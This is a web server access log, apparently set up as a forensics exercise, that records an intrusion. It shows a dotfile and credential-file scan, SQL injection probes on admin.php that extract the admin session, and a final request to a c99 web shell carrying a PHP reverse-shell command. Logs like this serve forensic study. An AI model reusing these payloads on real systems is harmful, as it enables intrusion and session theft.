192.168.1.165 - - [17/Jun/2022:15:52:38 +0200] "GET /setup.php HTTP/2.0" 500 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" "-"
192.168.1.165 - - [17/Jun/2022:15:54:42 +0200] "GET /setup.php HTTP/2.0" 500 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" "-"
192.168.1.165 - - [17/Jun/2022:15:54:42 +0200] "GET /setup.php HTTP/2.0" 500 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" "-"
192.168.1.165 - - [17/Jun/2022:15:54:43 +0200] "GET /setup.php HTTP/2.0" 500 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" "-"
192.168.1.165 - - [17/Jun/2022:15:54:43 +0200] "GET /setup.php HTTP/2.0" 500 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" "-"
192.168.1.165 - - [17/Jun/2022:15:54:43 +0200] "GET /setup.php HTTP/2.0" 500 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" "-"
192.168.1.165 - - [17/Jun/2022:15:54:43 +0200] "GET /setup.php HTTP/2.0" 500 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" "-"
174.10.50.30 - - [17/Jun/2022:21:08:26 +0200] "GET /.filemap HTTP/1.1" 403 5143 "-" "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)" "-"
174.10.50.30 - - [17/Jun/2022:21:08:26 +0200] "GET /..; HTTP/1.1" 403 5143 "-" "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)" "-"
174.10.50.30 - - [17/Jun/2022:21:08:30 +0200] "GET /.sucuriquarantine HTTP/1.1" 403 5143 "-" "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)" "-"
174.10.50.30 - - [17/Jun/2022:21:08:32 +0200] "GET /.lighttpd.conf HTTP/1.1" 403 5143 "-" "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)" "-"
174.10.50.30 - - [17/Jun/2022:21:08:37 +0200] "GET /.sqlite_history HTTP/1.1" 403 5143 "-" "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)" "-"
174.10.50.30 - - [17/Jun/2022:21:08:45 +0200] "GET /app/.htaccess HTTP/1.1" 403 5143 "-" "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)" "-"
174.10.50.30 - - [17/Jun/2022:21:08:46 +0200] "GET /.git/logs/refs/heads/master HTTP/1.1" 403 5143 "-" "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)" "-"
174.10.50.30 - - [17/Jun/2022:21:08:47 +0200] "GET /.cc-ban.txt HTTP/1.1" 403 5143 "-" "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)" "-"
174.10.50.30 - - [17/Jun/2022:21:08:50 +0200] "GET /.git-rewrite HTTP/1.1" 403 5143 "-" "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)" "-"
174.10.50.30 - - [17/Jun/2022:21:08:57 +0200] "GET /.ksh_history HTTP/1.1" 403 5143 "-" "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)" "-"
174.10.50.30 - - [17/Jun/2022:21:09:04 +0200] "GET /.hta HTTP/1.1" 403 5143 "-" "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)" "-"
174.10.50.30 - - [17/Jun/2022:21:09:05 +0200] "GET /.selected_editor HTTP/1.1" 403 5143 "-" "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)" "-"
174.10.50.30 - - [17/Jun/2022:21:09:05 +0200] "GET /.settings.php.swp HTTP/1.1" 403 5143 "-" "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)" "-"
174.10.50.30 - - [17/Jun/2022:21:09:06 +0200] "GET /.babelrc HTTP/1.1" 403 5143 "-" "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)" "-"
174.10.50.30 - - [17/Jun/2022:21:09:06 +0200] "GET /.inst HTTP/1.1" 403 5143 "-" "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)" "-"
174.10.50.30 - - [17/Jun/2022:21:09:08 +0200] "GET /.ht_wsr.txt HTTP/1.1" 403 5143 "-" "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)" "-"
174.10.50.30 - - [17/Jun/2022:21:09:08 +0200] "GET /.build HTTP/1.1" 403 5143 "-" "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)" "-"
174.10.50.30 - - [17/Jun/2022:21:09:09 +0200] "GET /.git/branches HTTP/1.1" 403 5143 "-" "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)" "-"
174.10.50.30 - - [17/Jun/2022:21:09:10 +0200] "GET /.htaccess.orig HTTP/1.1" 403 5143 "-" "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)" "-"
174.10.50.30 - - [17/Jun/2022:21:09:11 +0200] "GET /.htaccess.save HTTP/1.1" 403 5143 "-" "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)" "-"
174.10.50.30 - - [17/Jun/2022:21:09:14 +0200] "GET /.httpd.conf HTTP/1.1" 403 5143 "-" "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)" "-"
174.10.50.30 - - [17/Jun/2022:21:09:15 +0200] "GET /.login HTTP/1.1" 403 5143 "-" "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)" "-"
174.10.50.30 - - [17/Jun/2022:21:09:18 +0200] "GET /.settings HTTP/1.1" 403 5143 "-" "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)" "-"
174.10.50.30 - - [17/Jun/2022:21:09:18 +0200] "GET /.htaccess.old HTTP/1.1" 403 5143 "-" "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)" "-"
174.10.50.30 - - [17/Jun/2022:21:09:20 +0200] "GET /.mr.developer.cfg HTTP/1.1" 403 5143 "-" "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)" "-"
174.10.50.30 - - [17/Jun/2022:21:09:32 +0200] "GET /.ssh HTTP/1.1" 403 5143 "-" "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)" "-"
174.10.50.30 - - [17/Jun/2022:21:09:36 +0200] "GET /.jshintrc HTTP/1.1" 403 5143 "-" "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)" "-"
174.10.50.30 - - [17/Jun/2022:21:09:37 +0200] "GET /.zsh_history HTTP/1.1" 403 5143 "-" "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)" "-"
174.10.50.30 - - [17/Jun/2022:21:09:38 +0200] "GET /.CSV HTTP/1.1" 403 5143 "-" "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)" "-"
174.10.50.30 - - [17/Jun/2022:21:09:46 +0200] "GET /.sublime-workspace HTTP/1.1" 403 5143 "-" "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)" "-"
174.10.50.30 - - [17/Jun/2022:21:09:56 +0200] "GET /.sln HTTP/1.1" 403 5143 "-" "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)" "-"
174.10.50.30 - - [17/Jun/2022:21:09:58 +0200] "GET /.bashrc HTTP/1.1" 403 5143 "-" "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)" "-"
174.10.50.30 - - [17/Jun/2022:21:10:01 +0200] "GET /.buildignore HTTP/1.1" 403 5143 "-" "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)" "-"
174.10.50.30 - - [17/Jun/2022:21:10:02 +0200] "GET /.org-id-locations HTTP/1.1" 403 5143 "-" "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)" "-"
174.10.50.30 - - [17/Jun/2022:21:10:06 +0200] "GET /.pydevproject HTTP/1.1" 403 5143 "-" "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)" "-"
174.10.50.30 - - [17/Jun/2022:21:10:15 +0200] "GET /.config/filezilla/sitemanager.xml.xml HTTP/1.1" 403 5143 "-" "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)" "-"
174.10.50.30 - - [17/Jun/2022:21:10:16 +0200] "GET /.cproject HTTP/1.1" 403 5143 "-" "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)" "-"
174.10.50.30 - - [17/Jun/2022:21:10:17 +0200] "GET /.Blog.ini.php HTTP/1.1" 403 5143 "-" "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)" "-"
174.10.50.30 - - [17/Jun/2022:21:10:20 +0200] "GET /.bash_history HTTP/1.1" 403 5143 "-" "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)" "-"
174.10.50.30 - - [17/Jun/2022:21:10:20 +0200] "GET /.xvpics HTTP/1.1" 403 5143 "-" "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)" "-"
174.10.50.30 - - [17/Jun/2022:21:10:21 +0200] "GET /.hg/requires HTTP/1.1" 403 5143 "-" "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)" "-"
174.10.50.30 - - [17/Jun/2022:21:10:23 +0200] "GET /.psqlrc HTTP/1.1" 403 5143 "-" "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)" "-"
174.10.50.30 - - [17/Jun/2022:21:10:23 +0200] "GET /.git/objects HTTP/1.1" 403 5143 "-" "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)" "-"
174.10.50.30 - - [17/Jun/2022:21:10:26 +0200] "GET /.jshintignore HTTP/1.1" 403 5143 "-" "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)" "-"
174.10.50.30 - - [17/Jun/2022:21:10:26 +0200] "GET /.zeus.sock HTTP/1.1" 403 5143 "-" "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)" "-"
174.10.50.30 - - [17/Jun/2022:21:10:28 +0200] "GET /.idea/sqlDataSources.xml HTTP/1.1" 403 5143 "-" "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)" "-"
174.10.50.30 - - [17/Jun/2022:21:10:31 +0200] "GET /.git/logs/refs/remotes/origin/master HTTP/1.1" 403 5143 "-" "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)" "-"
174.10.50.30 - - [17/Jun/2022:21:10:34 +0200] "GET /.settings/.jsdtscope HTTP/1.1" 403 5143 "-" "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)" "-"
174.10.50.30 - - [17/Jun/2022:21:10:34 +0200] "GET /.ssh.asp HTTP/1.1" 403 5143 "-" "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)" "-"
174.10.50.30 - - [17/Jun/2022:21:10:37 +0200] "GET /.pwd HTTP/1.1" 403 5143 "-" "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)" "-"
174.10.50.30 - - [17/Jun/2022:21:10:43 +0200] "GET /.magentointel-cache HTTP/1.1" 403 5143 "-" "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)" "-"
174.10.50.30 - - [17/Jun/2022:21:10:45 +0200] "GET /.deployignore HTTP/1.1" 403 5143 "-" "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)" "-"
174.10.50.30 - - [17/Jun/2022:21:10:50 +0200] "GET /.sql HTTP/1.1" 403 5143 "-" "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)" "-"
174.10.50.30 - - [17/Jun/2022:21:10:54 +0200] "GET /.mwsql_history HTTP/1.1" 403 5143 "-" "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)" "-"
174.10.50.30 - - [17/Jun/2022:21:10:55 +0200] "GET /.profile HTTP/1.1" 403 5143 "-" "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)" "-"
174.10.50.30 - - [17/Jun/2022:21:10:59 +0200] "GET /.git/refs/remotes/origin/master HTTP/1.1" 403 5143 "-" "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)" "-"
174.10.50.30 - - [17/Jun/2022:21:11:00 +0200] "GET /.local HTTP/1.1" 403 5143 "-" "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)" "-"
174.10.50.30 - - [17/Jun/2022:21:11:02 +0200] "GET /.backups.rar HTTP/1.1" 403 5143 "-" "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)" "-"
174.10.50.30 - - [17/Jun/2022:21:11:07 +0200] "GET /.procmailrc HTTP/1.1" 403 5143 "-" "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)" "-"
174.10.50.30 - - [17/Jun/2022:21:11:07 +0200] "GET /.old HTTP/1.1" 403 5143 "-" "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)" "-"
174.10.50.30 - - [17/Jun/2022:21:11:09 +0200] "GET /.vgextensions HTTP/1.1" 403 5143 "-" "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)" "-"
174.10.50.30 - - [17/Jun/2022:21:11:12 +0200] "GET /.ftpquota HTTP/1.1" 403 5143 "-" "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)" "-"
174.10.50.30 - - [17/Jun/2022:21:11:12 +0200] "GET /.sh HTTP/1.1" 403 5143 "-" "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)" "-"
174.10.50.30 - - [17/Jun/2022:21:11:17 +0200] "GET /.settings/org.eclipse.core.resources.prefs HTTP/1.1" 403 5143 "-" "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)" "-"
174.10.50.30 - - [17/Jun/2022:21:11:26 +0200] "GET /.tox HTTP/1.1" 403 5143 "-" "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)" "-"
174.10.50.30 - - [17/Jun/2022:21:11:27 +0200] "GET /.tests HTTP/1.1" 403 5143 "-" "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)" "-"
174.10.50.30 - - [17/Jun/2022:21:11:27 +0200] "GET /.c9 HTTP/1.1" 403 5143 "-" "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)" "-"
174.10.50.30 - - [17/Jun/2022:21:11:35 +0200] "GET /.backup.tar.gz HTTP/1.1" 403 5143 "-" "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)" "-"
174.10.50.30 - - [17/Jun/2022:21:11:40 +0200] "GET /.remote-sync.json HTTP/1.1" 403 5143 "-" "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)" "-"
174.10.50.30 - - [17/Jun/2022:21:11:43 +0200] "GET /.mail_aliases HTTP/1.1" 403 5143 "-" "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)" "-"
174.10.50.30 - - [17/Jun/2022:21:14:56 +0200] "GET /admin.php?limit=10&offset=-1 HTTP/1.1" 500 5 "-" "Mozilla/0.0 (Windows NT 0.0; Win99; x12) AppleWebKit/007.01 (KHTML, like Gecko) Chrome/01.1.1234.12 Safari/007.01" "-"
174.10.50.30 - - [17/Jun/2022:21:16:56 +0200] "GET /admin.php?limit=10&offset=0;%5C;)-- HTTP/1.1" 500 5 "-" "Mozilla/0.0 (Windows NT 0.0; Win99; x12) AppleWebKit/007.01 (KHTML, like Gecko) Chrome/01.1.1234.12 Safari/007.01" "-"
174.10.50.30 - - [17/Jun/2022:21:18:56 +0200] "GET /admin.php?limit=10&offset=0)UNION(SELECT%200;-- HTTP/1.1" 500 5 "-" "Mozilla/0.0 (Windows NT 0.0; Win99; x12) AppleWebKit/007.01 (KHTML, like Gecko) Chrome/01.1.1234.12 Safari/007.01" "-"
174.10.50.30 - - [17/Jun/2022:21:20:56 +0200] "GET /admin.php?limit=10&offset=0)UNION(SELECT%200,test;-- HTTP/1.1" 500 5 "-" "Mozilla/0.0 (Windows NT 0.0; Win99; x12) AppleWebKit/007.01 (KHTML, like Gecko) Chrome/01.1.1234.12 Safari/007.01" "-"
174.10.50.30 - - [17/Jun/2022:21:22:56 +0200] "GET /admin.php?limit=10&offset=0)UNION(SELECT%200,test,test;-- HTTP/1.1" 500 5 "-" "Mozilla/0.0 (Windows NT 0.0; Win99; x12) AppleWebKit/007.01 (KHTML, like Gecko) Chrome/01.1.1234.12 Safari/007.01" "-"
174.10.50.30 - - [17/Jun/2022:21:24:57 +0200] "GET /admin.php?limit=10&offset=0)UNION(SELECT%200,(select%20session%20from%20users%20where%20username='admin'),test;-- HTTP/1.1" 500 5 "-" "Mozilla/0.0 (Windows NT 0.0; Win99; x12) AppleWebKit/007.01 (KHTML, like Gecko) Chrome/01.1.1234.12 Safari/007.01" "-"
174.10.50.30 - - [17/Jun/2022:22:07:47 +0200] "GET /c99shell.php?act=cmd&d=%2Fvar%2Fwww%2Fshadow4dga%2F&cmd=php+-r+%27%24sock%3Dfsockopen%28%22174.10.50.30%22%2C2222%29%3Bexec%28%22%2Fbin%2Fbash+-i+%3C%263+%3E%263+2%3E%263%22%29%3B%27&cmd_txt=1&submit=Execute HTTP/2.0" 504 5143 "https://174.10.50.1/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" "-"
